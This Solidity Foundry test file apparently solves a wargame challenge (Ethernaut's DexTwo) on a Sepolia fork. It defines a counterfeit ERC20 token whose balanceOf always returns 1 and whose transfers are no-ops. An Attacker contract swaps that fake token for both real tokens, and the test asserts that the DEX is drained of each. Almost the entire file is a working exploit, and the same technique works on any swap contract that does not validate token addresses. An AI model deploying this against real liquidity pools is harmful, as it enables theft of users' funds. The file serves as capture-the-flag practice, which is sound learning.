// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "forge-std/Test.sol";

interface DexTwo {
    function token1() external returns (address);
    function token2() external returns (address);

    function swap(address from, address to, uint amount) external;

    function getSwapPrice(address from, address to, uint amount) external view returns(uint);

    function approve(address spender, uint amount) external ;

    function balanceOf(address token, address account) external view returns (uint);
}

interface IERC20 {
    function transfer(address recipient, uint256 amount) external returns (bool);
    function balanceOf(address account) external returns (uint256);
    function transferFrom(address from, address to, uint256 value) external returns (bool);
}

contract FakeErc20 is IERC20 {
    uint256 public balance;
    function transfer(address recipient, uint256 amount) public override returns (bool) {
        return true;
    }
    function balanceOf(address account) public override returns (uint256) {
        return 1;
    }

    function approve(address spender, uint amount) external {
    }

    function transferFrom(address from, address to, uint256 value) external returns (bool){
        return true;
    }

}

contract Attacker {
    function attack(DexTwo dextwo) public{
        IERC20 fake = new FakeErc20();
        dextwo.swap(address(fake), dextwo.token1(), 1);
        dextwo.swap(address(fake), dextwo.token2(), 1);
    }
}

contract DexTest is Test {
    function setUp() public {
        vm.createSelectFork("sepolia", 5454891);
    }

    function test_dextwo() public {
        address player  = 0x8AC4E3906688EfE71818531a9e439A7ABFDA0154;
        DexTwo dextwo = DexTwo(0x083Dd2677841Ac0Ffea2F11350B1180628a76141);

        Attacker attacker = new Attacker();
        attacker.attack(dextwo);
        require(0 == dextwo.balanceOf(dextwo.token1(), address(dextwo)), "DexTwo token 1 should be drained");
        require(0 == dextwo.balanceOf(dextwo.token2(), address(dextwo)), "DexTwo token 2 should be drained");
    }
}
